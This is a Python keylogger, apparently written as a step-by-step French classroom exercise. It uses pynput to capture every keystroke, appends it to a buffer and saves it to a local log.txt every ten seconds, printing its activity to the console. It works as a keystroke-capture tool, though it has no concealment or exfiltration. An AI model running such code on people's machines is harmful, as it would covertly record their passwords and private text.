import pynput
import pynput.keyboard
import threading
import os


# 10.1. Déclarez une variable globale log de type string
log = ""

# 11.2. Déclarer une variable globale path de type os.path
path = os.path.join(os.getcwd(), "log.txt")


# 11.3. Déclarer une fonction report() pour sauvegarder les caractères dans le fichier log
def report():
    # 11.3.1. Déclarer les deux variables globales log et path
    global log, path

    # 11.3.2. Créer une variable logfile = open(path, "a")
    if log:  # Only write if log is not empty
        print(f"\n[SAUVEGARDE] Écriture de {len(log)} caractères dans {path}")
        logfile = open(path, "a")
        logfile.write(log)
        logfile.close()
        print(f"[SAUVEGARDE] ✅ Sauvegarde réussie ! Log vidé.")
        log = ""  # Clear log after writing
    else:
        print("[SAUVEGARDE] Aucun caractère à sauvegarder (log vide)")

    # Schedule the next report in 10 seconds
    print(f"[TIMER] Prochaine sauvegarde dans 10 secondes...")
    timer = threading.Timer(10, report)
    timer.daemon = True
    timer.start()


# Créer la méthode processkeys(key) qui prend comme paramètre une touche du clavier sur laquelle on a appuyé, affiche sa valeur.
def processkeys(key):
    global log  # Permet de modifier la variable globale
    
    # 10.3. On utilise try...except car key.char n'existe que pour les caractères normaux
    try:
        # 10.2. Pour chaque touche pressée, concaténer le caractère dans la variable log
        log += key.char
        print(log)  # Afficher le log complet
    except AttributeError:
        # 10.4. Gérer les espaces, retours chariot et backspaces
        if key == pynput.keyboard.Key.space:
            log += " "
            print(log)
        elif key == pynput.keyboard.Key.enter:
            log += "\n"
            print(log)
        elif key == pynput.keyboard.Key.backspace:
            # Supprimer le dernier caractère
            log = log[:-1]
            print(log)
        else:
            pass  # Ne rien ajouter au log

# 6.1. Déclarez une variable keyboard_listener qui va contenir le résultat de l'appel de la fonction pynput.keyboard.Listener()
keyboard_listener = pynput.keyboard.Listener(on_press=processkeys)


# Créer la méthode start_keylogger() qui démarre l'écouteur de clavier.
def start_keylogger():   
    # 7. Ajouter les lignes de code suivantes
    report()  # Start periodic reporting
    with keyboard_listener:
        keyboard_listener.join()


if __name__ == "__main__":
    start_keylogger()